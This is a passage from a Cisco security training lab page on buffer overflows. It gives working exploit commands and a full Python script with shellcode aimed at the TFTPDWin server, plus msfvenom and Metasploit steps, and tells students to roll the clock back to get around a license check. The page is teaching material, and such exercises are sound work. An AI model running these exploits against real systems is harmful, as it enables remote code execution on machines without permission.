  seccon@(none):~/overflows$ env - /home/seccon/overflows/vuln1 "$(python -c 'print "\x90"*(524-70)+"\xdb\xdc\xba\x0b\x45\x71\x2f\xd9\x74\x24\xf4\x5d\x2b\xc9" +"\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xfe\x2f" +"\x7a\x77\x99\xe2\x1a\xef\xb4\x61\x6a\x08\xae\x4a\x1f\xbf" +"\x2e\xfd\xf0\x5d\x47\x93\x87\x41\xc5\x83\x90\x85\xe9\x53" +"\x8e\xe7\x80\x3d\xff\x94\x3a\xc2\xa8\x09\x33\x23\x9b\x2e"+"\xc3\xfd\xff\xbf"')"
  You entered:...
  Segmentation fault


  # Added 16 more to Return Address "\xc3\xfd\xff\xbf" -> "\xd3\xfd\xff\xbf"
  seccon@(none):~/overflows$ env - /home/seccon/overflows/vuln1 "$(python -c 'print "\x90"*(524-70)+"\xdb\xdc\xba\x0b\x45\x71\x2f\xd9\x74\x24\xf4\x5d\x2b\xc9" +"\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xfe\x2f" +"\x7a\x77\x99\xe2\x1a\xef\xb4\x61\x6a\x08\xae\x4a\x1f\xbf" +"\x2e\xfd\xf0\x5d\x47\x93\x87\x41\xc5\x83\x90\x85\xe9\x53" +"\x8e\xe7\x80\x3d\xff\x94\x3a\xc2\xa8\x09\x33\x23\x9b\x2e"+"\xd3\xfd\xff\xbf"')"
  You entered:...
  $
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<h2>Exercise 2 : Remote Windows Shellcode</h2>
<hr>
<h3>Task 1</h3>
<p> Login to <em>windows</em>. <strong>To get around a license key for the service, set the clock back to 1 September 2014</strong>. Run the <em>tftpdwin</em> installer on the desktop. Don't run it on startup, and don't run it after it's installed.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint5" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint5" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<img src="os_files/tftpdwin_install.png"> <br>

</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 2</h3>
<p>Run <em>tftpdwin</em> in <em>Immunity Debugger</em>. Press F9 to run, or Debug-&gt;Run.</p>


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint6" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint6" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<img src="os_files/tftpdwin_run.png"> <br>

</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 3</h3>
<p>Use&nbsp;<em>pattern_create.rb</em>&nbsp;to create a pattern of 500 bytes.</p>
<pre>
./pattern_create.rb 500
</pre>

<hr>
<h3>Task 4</h3>
Construct a message using the TCP header format in the table below. Use the pattern from task 3 as the filename and a packet type of write.
<hr>
<p><strong>TFTP Header</strong></p>
<div>
<table border="1">
<tbody>
<tr>
<td>
<p>2 Bytes</p>
</td>
<td>
<p>String</p>
</td>
<td>
<p>1 byte</p>
</td>
<td>
<p>string</p>
</td>
<td>
<p>1 Byte</p>
</td>
</tr>
<tr>
<td>
<p>Packet Type</p>
</td>
<td>
<p>Filename</p>
</td>
<td>
<p>0x00</p>
</td>
<td>
<p>"netascii"</p>
</td>
<td>
<p>0x00</p>
</td>
</tr>
</tbody>
</table>
</div>
<hr>
<p><strong>Packet Types</strong></p>
<div>
<table border="1">
<tbody>
<tr>
<td>
<p><strong>Type</strong></p>
</td>
<td>
<p><strong>Value</strong></p>
</td>
</tr>
<tr>
<td>
<p>Read</p>
</td>
<td>
<p>0x01</p>
</td>
</tr>
<tr>
<td>
<p>Write</p>
</td>
<td>
<p>0x02</p>
</td>
</tr>
<tr>
<td>
<p>Data</p>
</td>
<td>
<p>0x03</p>
</td>
</tr>
<tr>
<td>
<p>ACK</p>
</td>
<td>
<p>0x04</p>
</td>
</tr>
<tr>
<td>
<p>Error</p>
</td>
<td>
<p>0x05</p>
</td>
</tr>
</tbody>
</table>
</div>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat10" href="#"> ++ Click here to Cheat with Python</a>
<div class="modal fade" id="Cheat10" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
~/labs/07-overflows$ export PATTERN=$(./pattern_create.rb 500)
seccon@seccon-kali2:~/labs/07-overflows$ python
Python 2.7.3 (default, Mar 14 2014, 11:57:14)
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> pattern = os.environ['PATTERN']
>>> dgram="\x00\x02"+pattern+"\x00netascii\x00"
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->



<hr>
<h3>Task 5</h3>
Place the message in a UDP datagram addressed to the windows machine on port 69. This should crash tftpdwin due to an invalid read.


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat11" href="#"> ++ Click here to Cheat with Python</a>
<div class="modal fade" id="Cheat11" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  >>> import socket
  >>> socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(dgram,("windows",69))
  512
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 6</h3>
Use the address the invalid read occurred on and pattern_offset.rb to find the offset.


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint7" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint7" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<img src="os_files/tftpdwin_crash.png"> <br>
This offset isn't quite what we are looking for to get execution.
</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat12" href="#"> ++ Click here to Cheat</a>
<div class="modal fade" id="Cheat12" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  ./pattern_offset.rb 41366a41
  [*] Exact match at offset 288
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<hr>
<h3>Bonus</h3>
Find the offset needed for execution in the methodical manner.

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint8" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint8" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
A strcpy is invoked @ 0x004063A4 which copies your payload to the stack.</br>
Another strcpy is invoked @ 0x004063B2 which copies your payload to 0x00AA1F62.</br>
A strcat @ 0x00406473 finally writes our buffer back to the stack and overwrites the saved EIP.</br>
</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat13" href="#"> ++ Click here to Cheat</a>
<div class="modal fade" id="Cheat13" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
The distance between the start of our buffer and the return address is 284 bytes.

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<hr>
<h3>Task 7</h3>
Read the cheat from the bonus above, and find a sequence (Ctrl-S) of commands matching: POP R32, RET. Have execution jump to this address.

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint9" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint9" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">

      <img src="os_files/tftpdwin_find.png"> <br>

</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 8</h3>
Generate some shell code with msfpayload and msfencode. Something simple like executing calc. Remember it has to fit in our buffer.

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat14" href="#"> ++ Click here to Cheat</a>
<div class="modal fade" id="Cheat14" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
msfvenom -p windows/exec CMD=calc -e x86/shikata_ga_nai -b '\x00' -f python
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->



<hr>
<h3>Task 9</h3>
Create your exploit datagram, and send it

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint10" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint10" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">

      <table border="1">
      <tbody>
      <tr>
      <td>
      <p>NOP sled</p>
      </td>
      <td>
      <p>shellcode</p>
      </td>
      <td>
      <p>return address</p>
      </td>
      </tr>
      </tbody>
      </table>

</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->





<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat15" href="#"> ++ Click here to Cheat</a>
<div class="modal fade" id="Cheat15" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  #export PATTERN=$(./pattern_create.rb 500)
  echo '#import os
  #pattern = os.environ["PATTERN"]
  shellcode = \
  "\xdb\xde\xd9\x74\x24\xf4\xba\x09\x92\x3f\x69\x5e\x33\xc9" + \
  "\xb1\x32\x31\x56\x17\x83\xee\xfc\x03\x5f\x81\xdd\x9c\xa3" + \
  "\x4d\xa8\x5f\x5b\x8e\xcb\xd6\xbe\xbf\xd9\x8d\xcb\x92\xed" + \
  "\xc6\x99\x1e\x85\x8b\x09\x94\xeb\x03\x3e\x1d\x41\x72\x71" + \
  "\x9e\x67\xba\xdd\x5c\xe9\x46\x1f\xb1\xc9\x77\xd0\xc4\x08" + \
  "\xbf\x0c\x26\x58\x68\x5b\x95\x4d\x1d\x19\x26\x6f\xf1\x16" + \
  "\x16\x17\x74\xe8\xe3\xad\x77\x38\x5b\xb9\x30\xa0\xd7\xe5" + \
  "\xe0\xd1\x34\xf6\xdd\x98\x31\xcd\x96\x1b\x90\x1f\x56\x2a" + \
  "\xdc\xcc\x69\x83\xd1\x0d\xad\x23\x0a\x78\xc5\x50\xb7\x7b" + \
  "\x1e\x2b\x63\x09\x83\x8b\xe0\xa9\x67\x2a\x24\x2f\xe3\x20" + \
  "\x81\x3b\xab\x24\x14\xef\xc7\x50\x9d\x0e\x08\xd1\xe5\x34" + \
  "\x8c\xba\xbe\x55\x95\x66\x10\x69\xc5\xce\xcd\xcf\x8d\xfc" + \
  "\x1a\x69\xcc\x6a\xdc\xfb\x6a\xd3\xde\x03\x75\x73\xb7\x32" + \
  "\xfe\x1c\xc0\xca\xd5\x59\x3e\x81\x74\xcb\xd7\x4c\xed\x4e" + \
  "\xba\x6e\xdb\x8c\xc3\xec\xee\x6c\x30\xec\x9a\x69\x7c\xaa" + \
  "\x77\x03\xed\x5f\x78\xb0\x0e\x4a\x1b\x57\x9d\x16\xdc"
  #dgram="\x00\x02"+pattern+"\x00netascii\x00"
  #dgram="\x00\x02"+"A"*288+"\x0C\xB0\xCE\xFA"+"\x00netascii\x00"
  address="\x18\xc6\x42"
  nopsled="\x90"*(284-len(shellcode))
  dgram="\x00\x02"+nopsled+shellcode+address+"\x00netascii\x00"
  import socket
  socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(dgram,("windows",69))' > py_exploit
  python py_exploit
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->




<hr>
<h3>Bonus</h3>
 Exploit tftpdwin outside the debugger.

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint10" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint10" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
Shouldn't require any additional work.
</div>
</div>
<hr><br>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->



<h2>Exercise 3 : Remote Windows Shellcode (The Easy Way)</h2>

Why do all the work of Exercise 2? Someone has already done it for us and made a metasploit module.


<hr>
<h3>Task 1</h3>
<p>Use metasploit's&nbsp;<em>exploit/windows/tftp/tftpdwin_long_filename</em>&nbsp;module to gain a shell on the windows box.</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat16" href="#"> ++ Click here to Cheat</a>
<div class="modal fade" id="Cheat16" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>

seccon@seccon-kali2:~/labs/overflows$ msfconsole
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


Save your shells from AV! Upgrade to advanced AV evasion using dynamic
exe templates with Metasploit Pro -- type 'go_pro' to launch it now.

       =[ metasploit v4.9.2-2014042301 [core:4.9 api:1.0] ]
+ -- --=[ 1292 exploits - 694 auxiliary - 206 post ]
+ -- --=[ 335 payloads - 35 encoders - 8 nops      ]

msf > use exploit/windows/tftp/tftpdwin_long_filename
msf exploit(tftpdwin_long_filename) > set RHOST windows
RHOST => windows
msf exploit(tftpdwin_long_filename) > set PAYLOAD windows/exec
PAYLOAD => windows/exec
msf exploit(tftpdwin_long_filename) > set CMD calc.exe
CMD => calc.exe
msf exploit(tftpdwin_long_filename) > exploit

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->








<div class="nextsection">
    <div style="float:left; font-size: .9em;">

    </div>
    <div style="float:right; font-size: .9em;">

            <div class="btn-group">
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;#&#39;">Congratulations! You have completed the course!</button>
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;#&#39;">
                        <span class="glyphicon glyphicon-chevron-right" style="color:white;" aria-hidden="true"></span>
                </button>
            </div>

    </div>
</div>

</div><!-- Whole page container -->

			<!-- </div> -->
    	<!--- </div> -->
        <span style="font-size:.7em; color:0x696969; float:right;margin:30px 20px 0px 0px;">© Copyright Cisco Systems</span>



<script src="./os_files/jquery.min.js"></script>
<script src="./os_files/bootstrap.min.js"></script>
<!-- <script src="/static/js/ZeroClipboard.js" type="text/javascript"></script> -->
<script src="./os_files/highlight.pack.js"></script>
<script type="text/javascript" src="./os_files/sijax.js"></script>
<script type="text/javascript" src="./os_files/cssterm.js"></script>
<script type="text/javascript" src="./os_files/clipboard.min.js"></script>
<script type="text/javascript" src="./os_files/bootstrap-select.min.js"></script>
<script type="text/javascript">
    Sijax.setRequestUri("/pod1/basics/os");Sijax.setJsonUri("/static/js/sijax/json2.js");
</script>


<script type="text/javascript">
var urlParams;
(window.onpopstate = function () {
    var match,
        pl     = /\+/g,  // Regex for replacing addition symbol with a space
        search = /([^&=]+)=?([^&]*)/g,
        decode = function (s) { return decodeURIComponent(s.replace(pl, " ")); },
        query  = window.location.search.substring(1);

    urlParams = {};
    while (match = search.exec(query))
       urlParams[decode(match[1])] = decode(match[2]);
})();

// Config ZeroClipboard
//ZeroClipboard.config({
//    hoverClass: 'btn-clipboard-hover'
//})

// Insert copy to clipboard button before .ciscohl
//$('.ciscohl').each(function () {
//    var btnHtml = '<div class="zero-clipboard"><span class="btn-clipboard">Copy</span></div>';
//    $(this).before(btnHtml)
//});

function runit(codeid){
    var codeblock = "codeblock-" + codeid;
    var preblock =  "output-" + codeid;
    var outfixhtmlfunc = 'outputfixhtml' + codeid;
    var code = document.getElementById(codeblock).value;
	document.getElementById(preblock).innerHTML = '';
    Sk.configure({output:eval(outfixhtmlfunc) });
    eval(Sk.importMainWithBody("<stdin>", false, code));
}





//var zeroClipboard = new ZeroClipboard($('.btn-clipboard'));
//var htmlBridge = $('#global-zeroclipboard-html-bridge');
//
//// Handlers for ZeroClipboard
//zeroClipboard.on('ready', function (event) {
//    htmlBridge
//        .data('placement', 'top')
//        .attr('title', 'Copy to clipboard')
//        .tooltip();
//    var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//    console.log(ciscohl);
//
//    // Copy to clipboard
//    zeroClipboard.on('copy', function (event) {
//        var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//        console.log ( ciscohl[0].id );
//        var pod = urlParams["pod"];
//        var section = urlParams["section"];
//
//        $.ajax({
//	       //type: "GET",
//	       url: "/dash/collect/pod/1/basics/os/" + ciscohl[0].id
//	       // data:  "pod=" + pod + "&section=" + section + "&step=" + ciscohl[0].id
//        });
//        event.clipboardData.setData("text/plain", ciscohl.text());
//         // $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat top left / 45px 45px")
//         $(event.target).parent().next(".ciscohl").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")
//    });
//
//    // Notify copy success and reset tooltip title
//    zeroClipboard.on('aftercopy', function () {
//        htmlBridge
//            .attr('title', 'Copied!')
//            .tooltip('fixTitle')
//            .tooltip('show')
//            .attr('title', 'Copy to clipboard')
//            .tooltip('fixTitle');
//
//    });
//});
//
//function findPos(obj) {
//    var curtop = 0;
//    if (obj.offsetParent) {
//        do {
//            curtop += obj.offsetTop;
//        } while (obj = obj.offsetParent);
//    return [curtop];
//    }
//}
//
//
//// Notify copy failure
//zeroClipboard.on('error', function () {
//    ZeroClipboard.destroy();
//    htmlBridge
//        .attr('title', 'Flash required')
//        .tooltip('fixTitle')
//        .tooltip('show');
//});
//

///////////////////////////////////////////////////////////////////////////////
// Start NEW COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////

var clipboard = new Clipboard('.copybutton', {
    text: function(btn_object){
        var webcopy = $(btn_object).parent().nextAll('.ciscohl2').first();
        return webcopy[0].innerText + "\n\r";
    }
});
clipboard.on('success', function(e) {
    var webcopy = $(event.target).parent().nextAll('.ciscohl2').first();
    var pod = urlParams["pod"];
    var section = urlParams["section"];

    $.ajax({
        url: "/dash/collect/pod/1/basics/os/" + webcopy[0].id
    });
    $(event.target).parent().next(".ciscohl2").css("background","#e0ffcb url('/static/images/ok.png') no-repeat bottom right / 45px 45px")

    e.clearSelection();
});
///////////////////////////////////////////////////////////////////////////////
// End COPY/PASTE Clipboard code.
///////////////////////////////////////////////////////////////////////////////



$(document).ready(function(){
   // cache the window object
   $window = $(window);

    $('.selectpicker').selectpicker({
          style: 'btn-default',
          size: 12
      });






    // $('pre code').each(function(i, block) {
    //     hljs.highlightBlock(block);
    // });

   $('section[data-type="background"]').each(function(){
     // declare the variable to affect the defined data-type
     var $scroll = $(this);

      $(window).scroll(function() {
        // HTML5 proves useful for helping with creating JS functions!
        // also, negative value because we're scrolling upwards
        var yPos = -($window.scrollTop() / $scroll.data('speed'));

        // background position
        var coords = '50% '+ yPos + 'px';

        // move the background
        $scroll.css({ backgroundPosition: coords });
      }); // end window scroll
   });  // end section function
}); // close out script


</script>

<textarea readonly="" style="font-size: 12pt; border: 0px; padding: 0px; margin: 0px; position: absolute; left: -9999px; top: 0px;"></textarea></body></html>
